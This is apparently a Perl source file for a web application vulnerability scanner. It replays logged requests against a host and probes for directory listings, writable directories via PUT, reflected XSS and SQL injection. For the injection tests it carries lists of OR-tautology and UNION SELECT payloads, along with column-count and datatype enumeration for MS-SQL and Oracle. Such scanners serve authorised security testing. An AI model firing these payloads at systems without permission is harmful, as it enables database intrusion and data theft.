#!/usr/bin/perl

use LWP::UserAgent;
use strict;
use Getopt::Std;

my %args;
getopts('c:o:v', \%args);
  
printReport("\nExtended Web Application Scanner\n  v1.0 - <brian\@reeldeel.com>\n\n");

if ($#ARGV < 1) { 
 die "extendedScanner.pl [-o <file>] [-c <cookie data>] [-v] inputfile http://hostname\n\n-c: Use HTTP Cookie\n-o: Output File\n-v: Be Verbose\n"; 
}

# Open input file
open(IN, "< $ARGV[0]") or die"ERROR => Can't open file $ARGV[0].\n";    
my @requestArray = <IN>;

my ($oRequest,$oResponse, $oStatus, %dirLog, %paramLog, $paramRequest, $sqlVuln, $sqlOrVuln, $sqlUnionVuln, $sqlColumnVuln, $sqlDataTypeVuln, $unionExploitRequest, @dbDataTypeArray, @dtCombinations, $sqlDbType);

my $sqlRegEx = qr /(OLE DB|SQL Server|Incorrect Syntax|ODBC Driver|ORA-|SQL command not|Oracle Error Code|CFQUERY|MySQL|Sybase| DB2 |Pervasive|Microsoft Access|MySQL|CLI Driver|The string constant beginning with|does not have an ending string delimiter|JET Database Engine error)/i;

my %databaseInfo;

# MS-SQL
$databaseInfo{mssql}{tableName} = "MASTER\.\.SYSDATABASES";
$databaseInfo{mssql}{dataTypes} = ["CONVERT(VARCHAR,1)","CONVERT(INT,1)"];
$databaseInfo{mssql}{unionError} = qr /Invalid object name|Invalid table name/i;
$databaseInfo{mssql}{columnError} = qr /All queries in an? SQL statement containing/i;
$databaseInfo{mssql}{dataTypeError} = qr /error converting|Operand type clash/i;

# Oracle
$databaseInfo{oracle}{tableName} = "ALL_TABLES";
$databaseInfo{oracle}{dataTypes} = ["TO_CHAR(1)","TO_NUMBER(1)","TO_DATE('01','MM')"];
$databaseInfo{oracle}{unionError} = qr /table or view does not exist/i;
$databaseInfo{oracle}{columnError} = qr /incorrect number of result columns/i;
$databaseInfo{oracle}{dataTypeError} = qr /expression must have same datatype/i;

printReport("\n** Beginning Scan **\n\n");

# Loop through each of the input file requests
foreach $oRequest (@requestArray) {

 # Remove line breaks and carriage returns
 $oRequest =~ s/(\n|\r)//g;

 # Only process GETs and POSTs
 if ($oRequest =~ /^(GET|POST)/)  {

  # Check for request data
  if ($oRequest =~ /\?/) {
  
   # Issue the original request for reference purposes    
   ($oStatus, $oResponse) = makeRequest($oRequest);
   
   #Populate methodAndFile and reqData variables
   my ($methodAndFile, $reqData) = split(/\?/, $oRequest, 2);
   my @reqParams = split(/\&/, $reqData);
   
   my $pLogEntry = $methodAndFile;
   
   # Build parameter log entry
   my $parameter;
   foreach $parameter (@reqParams) {
    my ($pName) = split("=", $parameter);
    $pLogEntry .= "+".$pName;
   }
   $paramLog{$pLogEntry}++;
   if ($paramLog{$pLogEntry} eq 1) {
   
    # Loop to perform test on each parameter
    for (my $i = 0; $i <= $#reqParams; $i++) {       
     my $testData; 
    
     # Loop to reassemble the request parameters
     for (my $j = 0; $j <= $#reqParams; $j++) {   
      if ($j == $i) {
       my ($varName, $varValue) = split("=",$reqParams[$j],2);
       $testData .= $varName."="."---PLACEHOLDER---"."&";  
      } else {
       $testData .= $reqParams[$j]."&";
      }
     }
     chop($testData);
     $paramRequest = $methodAndFile."?".$testData;

     ## Perform input validation tests
     $sqlVuln = &sqlTest;
     if ($sqlVuln != 0) {
      $sqlOrVuln = &sqlOrTest;
      if ($sqlOrVuln ne "false") {
       $sqlColumnVuln = 0;
       $sqlDataTypeVuln = "false";
       if ($sqlOrVuln =~ /--$/) {
        $sqlColumnVuln = &sqlBlindColumnTest;
        if ($sqlColumnVuln != 0) {
         $sqlDataTypeVuln = &sqlBlindDataTypeTest;
        }
       }
       if (($sqlColumnVuln == 0) || ($sqlDataTypeVuln ne "true")) {
        $sqlUnionVuln = &sqlUnionTest;
        if ($sqlUnionVuln ne "false") {
         if ($sqlColumnVuln == 0) {
          $sqlColumnVuln = &sqlColumnTest;
         }
         if ($sqlColumnVuln != 0) {
          $sqlDataTypeVuln = &sqlDataTypeTest;
         }
        }
       }
      }
     }
     my $xssVuln = xssTest($paramRequest);

    } # End of loop for each request parameter
   } # End if statement for unque parameter combos
  } # Close if statement checking for request data  
   
  my $trash;
  ($trash, $oRequest, $trash) = split(/\ |\?/, $oRequest);
  my @directories = split(/\//, $oRequest);

  my @checkSlash = split(//, $oRequest);
  my $totalDirs = $#directories;

  # Start looping through each directory level
  for (my $d = 0; $d <= $totalDirs; $d++) {
   if ((($checkSlash[(-1)] ne "/") && ($d == 0)) || ($d != 0)) {
    pop(@directories);
   }

   my $dirRequest = "GET ".join("/", @directories)."\/";
   
   # Add directory log entry
   $dirLog{$dirRequest}++;
   if ($dirLog{$dirRequest} eq 1) {
    my $dListVuln = dirList($dirRequest);
    my $dPutVuln = dirPut($dirRequest);

   } # End check for unique directory
  } # End loop for each directory level
 } # End check for GET or POST request
} # End loop on each input file entry

printReport("\n\n** Scan Complete **\n\n");

sub dirPut {
 my ($putRequest, $putStatus, $putResults, $putVulnerable);
 ($putRequest) = @_;
 # Format the test request to upload the file
 $putRequest =~ s/^GET/PUT/;
 $putRequest .= "uploadTest.txt?ThisIsATest";

 # Make the request and get the response data
 ($putStatus, $putResults) = makeRequest($putRequest);
 # Format the request to check for the new file
 $putRequest =~ s/^PUT/GET/;
 $putRequest =~ s/\?ThisIsATest//;

 # Check for the uploaded file
 ($putStatus, $putResults) = makeRequest($putRequest);
 if ($putResults =~ /ThisIsATest/) {
  $putVulnerable = 1;

  # If vulnerable, print something to the user
  printReport("\n\nALERT: Writeable Directory Detected:\n=> $putRequest\n\n");
 } else {
  $putVulnerable = 0;
 }
 # Return the test results.
 return $putVulnerable;
}

sub dirList {
 my ($dirRequest, $dirStatus, $dirResults, $dirVulnerable);
 ($dirRequest) = @_;

 # Make the request and get the response data
 ($dirStatus, $dirResults) = makeRequest($dirRequest);

 # Check to see if it looks like a listing
 if ($dirResults =~ /(<TITLE>Index of \/|(<h1>|<title>)Directory Listing For|<title>Directory of|\"\?N=D\"|\"\?S=A\"|\"\?M=A\"|\"\?D=A\"| - \/<\/title>|&lt;dir&gt;| - \/<\/H1><hr>|\[To Parent Directory\])/i) {
  $dirVulnerable = 1;

  # If vulnerable, print something to the user
  printReport("\n\nALERT: Directory Listing Detected:\n=> $dirRequest\n\n");
 } else {
  $dirVulnerable = 0;
 }
 # Return the test results.
 return $dirVulnerable;
}

sub xssTest {
 my ($xssRequest, $xssStatus, $xssResults, $xssVulnerable);
 ($xssRequest) = @_;

 # Replace the "---PLACEHOLDER---" string with our test string
 $xssRequest =~ s/---PLACEHOLDER---/"><DEFANGED_script>alert('Vulnerable');<\/script>/;
 # Make the request and get the response data
 ($xssStatus, $xssResults) = makeRequest($xssRequest);

 # Check to see if the output matches our vulnerability signature.
 if ($xssResults =~ /"><DEFANGED_script>alert\('Vulnerable'\);<\/script>/i) {
  $xssVulnerable = 1;

  # If vulnerable, print something to the user
  printReport("\n\nALERT: Cross-Site Scripting Vulnerablilty Detected:\n=> $xssRequest\n\n");
 } else {
  $xssVulnerable = 0;
 }
 # Return the test results
 return $xssVulnerable;
}

sub sqlTest {
 my ($sqlRequest, $sqlStatus, $sqlResults, $sqlVulnerable);
 $sqlDbType = "unknown";
 $sqlRequest = $paramRequest;
 
 # Replace the "---PLACEHOLDER---" string with our test string
 $sqlRequest =~ s/---PLACEHOLDER---/te'st/;
 # Make the request and get the response data
 ($sqlStatus, $sqlResults) = makeRequest($sqlRequest);

 # Check to see if the output matches our vulnerability signature.
 if (($sqlResults =~ $sqlRegEx) && ($oResponse !~ $sqlRegEx)) {
  $sqlVulnerable = 1;
  printReport("\n\nALERT: Database Error Message Detected:\n=> $sqlRequest\n\n");
 } elsif (($sqlStatus =~ /^500/) && ($oStatus !~ /^500/)) {
  $sqlVulnerable = 2;
  printReport("\n\nALERT: 500 Error Code Detected:\n=> $sqlRequest\n\n");
 } elsif (($sqlResults =~ /error|unable to/i) && ($oResponse !~ /error|unable to/i)) {
  $sqlVulnerable = 3;
  printReport("\n\nALERT: Generic Error Message Detected:\n=> $sqlRequest\n\n");
 } elsif (length($sqlResults) < 100 && length($oResponse) > 100) {
  $sqlVulnerable = 4;
  printReport("\n\nALERT: Dramatically Small Response Detected:\n=> $sqlRequest\n\n");
 } else {
  $sqlVulnerable = 0;
 }
 # Return the test result indicator
 return $sqlVulnerable;
}


sub makeRequest {
 my ($request, $lwp, $method, $uri, $data, $req, $status, $content);   
 
 ($request)=@_;
 if ($args{v}) {
  printReport("Making Request: $request\n");
 } else {
  print ".";
 }

 # Setup LWP UserAgent
 $lwp = LWP::UserAgent->new(env_proxy => 1,
                            keep_alive => 1,
                            timeout => 30,
                            );
 # Method should always precede the request with a space
 ($method, $uri) = split(/ /, $request);

 # PUTS and POSTS should have data appended to the request
 if (($method eq "POST") || ($method eq "PUT")) {
  ($uri, $data) = split(/\?/, $uri);
 }
 # Append the URI to the hostname and setup the request
 $req = new HTTP::Request $method => $ARGV[1].$uri;

 # Add request content for POST and PUTS 
 if ($data) {
  $req->content_type('application/x-www-form-urlencoded');
  $req->content($data);
 }

 # If cookies are defined, add a COOKIE header
 if ($args{c}) {
  $req->header(Cookie => $args{c});
 }
 my $response = $lwp->request($req);

 # Extract the HTTP status code and HTML content from the response
 $status = $response->status_line;
 $content = $response->content;
 if ($status =~ /^400/) {
  die "Error:  Invalid URL or HostName\n\n";
 }
 return ($status, $content);
}

sub printReport {
 my ($printData) = @_;
 if ($args{o}) { 
  open(REPORT, ">>$args{o}") or die "ERROR => Can't write to file $args{o}\n";
  print REPORT $printData;
  close(REPORT);
 }
 print $printData;
}

sub sqlOrTest {
 my @sqlOrArray=(
  "1%20OR%20'1'%3D'1'--",
  "1'%20OR%201%3D1--",
  "1\)%20OR%20'1'%3D'1'--",
  "1'\)%20OR%201%3D1--",
  "1\)\)%20OR%20'1'%3D'1'--",
  "1'\)\)%20OR%201%3D1--",
  "1\)\)\)%20OR%20'1'%3D'1'--",
  "1'\)\)\)%20OR%201%3D1--",
  "%20OR%20'1'%3D'1'--",
  "'%20OR%201%3D1--",
  "1'%20OR%20'1'%3D'1",
  "1'%20OR%201%3D1",
  "1%20OR%20'1'%3D'1'",
  "1'\)%20OR%20\('1'%3D'1",
  "1'\)%20OR%20\(1%3D1",
  "1\)%20OR%20\('1'%3D'1'",
  "1'\)\)%20OR%20\(\('1'%3D'1",
  "1'\)\)%20OR%20\(\(1%3D1",
  "1\)\)%20OROR%20\(\('1'%3D'1'",
  "1'\)\)\)%20OR%20\(\(\('1'%3D'1",
  "1'\)\)\)%20OR%20\(\(\(1%3D1",
  "1\)\)\)%20OR%20\(\(\('1'%3D'1'"
 );
 my $sqlOrSuccess = "false";
 foreach my $sqlOr (@sqlOrArray) {
  if ($sqlOrSuccess eq "false") {

   # Replace the "---PLACEHOLDER---" string with our test string
   my $sqlOrTest = $paramRequest;
   $sqlOrTest =~ s/---PLACEHOLDER---/$sqlOr/;

   # Make the request and get the response data
   my ($sqlOrStatus, $sqlOrResults) = makeRequest($sqlOrTest);
   
   if (($sqlOrResults !~ $sqlRegEx && $sqlVuln == 1) || ($sqlOrStatus !~ /^500/ && $sqlVuln == 2) || ($sqlOrResults !~ /error|unable to/i && $sqlVuln == 3) || (length($sqlOrResults) > 100 && $sqlVuln == 4)) {
    $sqlOrSuccess = $sqlOr;
    printReport("\n\nALERT: Possible SQL Injection Exploit:\n=> $sqlOrTest\n\n");
   }
  }
 }
 return $sqlOrSuccess;
}


sub sqlUnionTest {

 my @sqlUnionArray=(
  "1%20UNION%20ALL%20select%20FOO%20from%20BLAH--",
  "1'%20UNION%20ALL%20select%20FOO%20from%20BLAH--",
  "1\)%20UNION%20ALL%20select%20FOO%20from%20BLAH--",
  "1'\)%20UNION%20ALL%20select%20FOO%20from%20BLAH--",
  "1\)\)%20UNION%20ALL%20select%20FOO%20from%20BLAH--",
  "1'\)\)%20UNION%20ALL%20select%20FOO%20from%20BLAH--",
  "1\)\)\)%20UNION%20ALL%20select%20FOO%20from%20BLAH--",
  "1'\)\)\)%20UNION%20ALL%20select%20FOO%20from%20BLAH--",
  "1%20UNION%20ALL%20select%20FOO%20from%20BLAH",
  "1'%20UNION%20ALL%20select%20FOO%20from%20BLAH",
  "1%20UNION%20ALL%20select%20FOO%20from%20BLAH%20where%201%3D1",
  "1'%20UNION%20ALL%20select%20FOO%20from%20BLAH%20where%20'1'%3D'1",
  "1\)%20UNION%20ALL%20select%20FOO%20from%20BLAH%20where%201%3D1%20OR\(1%3D1",
  "1'\)%20UNION%20ALL%20select%20FOO%20from%20BLAH%20where%20'1'%3D'1'%20OR\('1'%3D'1",
  "1\)\)%20UNION%20ALL%20select%20FOO%20from%20BLAH%20where%201%3D1%20OR\(\(1%3D1",
  "1'\)\)%20UNION%20ALL%20select%20FOO%20from%20BLAH%20where%20'1'%3D'1'%20OR\(\('1'%3D'1",
  "1\)\)\)%20UNION%20ALL%20select%20FOO%20from%20BLAH%20where%201%3D1%20OR\(\(\(1%3D1",
  "1'\)\)\)%20UNION%20ALL%20select%20FOO%20from%20BLAH%20where%20'1'%3D'1'%20OR\(\(\('1'%3D'1"
 );

 my $sqlUnionSuccess = "false";

 foreach my $sqlUnion (@sqlUnionArray) {
  if ($sqlUnionSuccess eq "false") {

   # Replace the "---PLACEHOLDER---" string with our test string
   my $sqlUnionTest = $paramRequest;
   $sqlUnionTest =~ s/---PLACEHOLDER---/$sqlUnion/;

   # Make the request and get the response data
   my ($sqlUnionStatus, $sqlUnionResults) = makeRequest($sqlUnionTest);

   foreach my $dbType (keys %databaseInfo) { 
    if ($sqlUnionResults =~ $databaseInfo{$dbType}{unionError}) {
     $sqlUnion =~ s/BLAH/$databaseInfo{$dbType}{tableName}/;
     $sqlDbType = $dbType;
     $sqlUnionSuccess = $sqlUnion;
    }
   }
  }
 }
 return $sqlUnionSuccess;
}

sub sqlColumnTest {
 my $sqlNumCols = 0;
 my $sqlColumnSuccess = "false";
 do {
  my $sqlColumnTestString = "%27%27".(",%27%27" x $sqlNumCols); 
  my $sqlColumnTest = $paramRequest;
  $sqlColumnTest =~ s/---PLACEHOLDER---/$sqlUnionVuln/;
  $sqlColumnTest =~ s/FOO/$sqlColumnTestString/;
 
  # Make the request and get the response data
  my ($sqlColumnStatus, $sqlColumnResults) = makeRequest($sqlColumnTest);
      
  if ($sqlColumnResults !~ $databaseInfo{$sqlDbType}{columnError})  {
   $sqlColumnSuccess = $sqlColumnTest;
  }
  $sqlNumCols++;
 } until (($sqlColumnSuccess ne "false") || ($sqlNumCols > 200));
 if ($sqlColumnSuccess ne "false") {
  return $sqlNumCols;
 } else {
  return 0;
 }
}

sub sqlBlindColumnTest {
 my $sqlBlindNumCols = 1;
 my $sqlBlindColumnSuccess = "false";
 do {
  my $sqlBlindColumnString = $sqlOrVuln;
  my $sqlBlindColumnTest = $paramRequest;
  
  $sqlBlindColumnString =~ s/--/%20ORDER%20BY%20$sqlBlindNumCols--/;
  $sqlBlindColumnTest =~ s/---PLACEHOLDER---/$sqlBlindColumnString/;
  
  # Make the request and get the response data
  my ($sqlBlindColumnStatus, $sqlBlindColumnResults) = makeRequest($sqlBlindColumnTest);
      
  if (($sqlBlindColumnResults =~ $sqlRegEx && $sqlVuln == 1) || ($sqlBlindColumnStatus =~ /^500/ && $sqlVuln == 2) || ($sqlBlindColumnResults =~ /error|unable to/i && $sqlVuln == 3) || (length($sqlBlindColumnResults) < 100 && $sqlVuln == 4)) {
   $sqlBlindColumnSuccess = $sqlBlindColumnTest;
  } else {
   $sqlBlindNumCols++;
  }
 } until (($sqlBlindColumnSuccess ne "false") || ($sqlBlindNumCols == 200));
 if (($sqlBlindColumnSuccess ne "false") && ($sqlBlindNumCols > 2)) {
  return $sqlBlindNumCols-1;
 } else {
  return 0;
 }
}


sub sqlDataTypeTest {
 my $sqlDataTypeSuccess = "false";
 
 if ($sqlColumnVuln <= 8) {
  my @sqlDataTypeDictionary = genRecurse();
  my $sqlDictionaryPos = 0;
  do {    
   my $sqlDataTypeTest = $paramRequest;
   $sqlDataTypeTest =~ s/---PLACEHOLDER---/$sqlUnionVuln/;
   $sqlDataTypeTest =~ s/FOO/$sqlDataTypeDictionary[$sqlDictionaryPos]/;
   my ($sqlDataTypeStatus, $sqlDataTypeResults) = makeRequest($sqlDataTypeTest);
   
   if ($sqlDataTypeResults !~ $databaseInfo{$sqlDbType}{dataTypeError}) {
    $sqlDataTypeSuccess = $sqlDataTypeTest;
    printReport("\n\nALERT: Possible SQL Injection Exploit:\n=> $sqlDataTypeTest\n\n");
   }
   $sqlDictionaryPos++;
  } until (($sqlDataTypeSuccess ne "false") || ($sqlDictionaryPos == $#sqlDataTypeDictionary + 1));
 }
}

sub sqlBlindDataTypeTest {
 $sqlDbType = "unknown";
 foreach my $databaseName (keys %databaseInfo) {
  my $sqlBlindDbDetectTest = $paramRequest;
  my $sqlBlindDbDetectString = $sqlOrVuln;
  my $sqlBlindDbDetectUnion = "%20UNION%20ALL%20SELECT%20null".",null" x ($sqlColumnVuln-1)."%20FROM%20$databaseInfo{$databaseName}{tableName}--";
  $sqlBlindDbDetectString =~ s/%20OR%20.*--/$sqlBlindDbDetectUnion/;
  $sqlBlindDbDetectTest =~ s/---PLACEHOLDER---/$sqlBlindDbDetectString/;
  my ($sqlBlindDbDetectStatus, $sqlBlindDbDetectResults) = makeRequest($sqlBlindDbDetectTest);
  if (($sqlBlindDbDetectResults !~ $sqlRegEx && $sqlVuln == 1) || ($sqlBlindDbDetectStatus !~ /^500/ && $sqlVuln == 2) || ($sqlBlindDbDetectResults !~ /error|unable to/i && $sqlVuln == 3) || (length($sqlBlindDbDetectResults) > 100 && $sqlVuln == 4)) {
   $sqlDbType = $databaseName;
  }
 }
 my $sqlBlindDataTypeSuccess = "false";
 if ($sqlDbType ne "unknown") { 
  my $sqlBlindColumnPos = 0;
  my @columns = ();
  for ($sqlBlindColumnPos = 0; $sqlBlindColumnPos < $sqlColumnVuln; $sqlBlindColumnPos++) {
   $columns[$sqlBlindColumnPos] = "null";
  }
  my $sqlBlindColumnPos = 0;
  my $sqlBlindDataTypePos = 0;
  do { 
   $columns[$sqlBlindColumnPos] = $databaseInfo{$sqlDbType}{dataTypes}[$sqlBlindDataTypePos];
   my $dataTypeCombo = join(",",@columns);
   
   my $sqlBlindDataTypeTest = $paramRequest;
   my $sqlBlindDataTypeString = $sqlOrVuln;
   my $sqlBlindDataTypeUnion = "%20UNION%20ALL%20SELECT%20$dataTypeCombo%20FROM%20$databaseInfo{$sqlDbType}{tableName}--";
   $sqlBlindDataTypeString =~ s/%20OR%20.*--/$sqlBlindDataTypeUnion/;
   $sqlBlindDataTypeTest =~ s/---PLACEHOLDER---/$sqlBlindDataTypeString/;
   my ($sqlBlindDataTypeStatus, $sqlBlindDataTypeResults) = makeRequest($sqlBlindDataTypeTest);
   my $dataTypeFieldSuccess = 0;
   if (($sqlBlindDataTypeResults !~ $sqlRegEx && $sqlVuln == 1) || ($sqlBlindDataTypeStatus !~ /^500/ && $sqlVuln == 2) || ($sqlBlindDataTypeResults !~ /error|unable to/i && $sqlVuln == 3) || (length($sqlBlindDataTypeResults) > 100 && $sqlVuln == 4)) {
    $dataTypeFieldSuccess = 1;
   }
   if ($dataTypeFieldSuccess == 1) {
    $sqlBlindColumnPos++;
    $sqlBlindDataTypePos = 0;
    if ($sqlBlindColumnPos == $sqlColumnVuln) {
     $sqlBlindDataTypeSuccess = "true";
     printReport("\n\nALERT: Possible SQL Injection Exploit:\n=> $sqlBlindDataTypeTest\n\n");
    }
   } else {
    $sqlBlindDataTypePos++;
    if ($sqlBlindDataTypePos > $#{$databaseInfo{$sqlDbType}{dataTypes}}) {
     $sqlBlindDataTypeSuccess = "error";
    }
   }
  } until ($sqlBlindDataTypeSuccess ne "false"); 
 }
 return $sqlBlindDataTypeSuccess;
} 
 

sub genRecurse {
 my $dd = shift;
 my @seq = @_;
 if ($dd >= $sqlColumnVuln) {
  my $combo = join(",", @seq);
  push (@dtCombinations, $combo);
 } else {
  foreach my $subReq (@{$databaseInfo{$sqlDbType}{dataTypes}}) {
   genRecurse($dd + 1, @seq, $subReq);
  }
 }
 return @dtCombinations;
}
 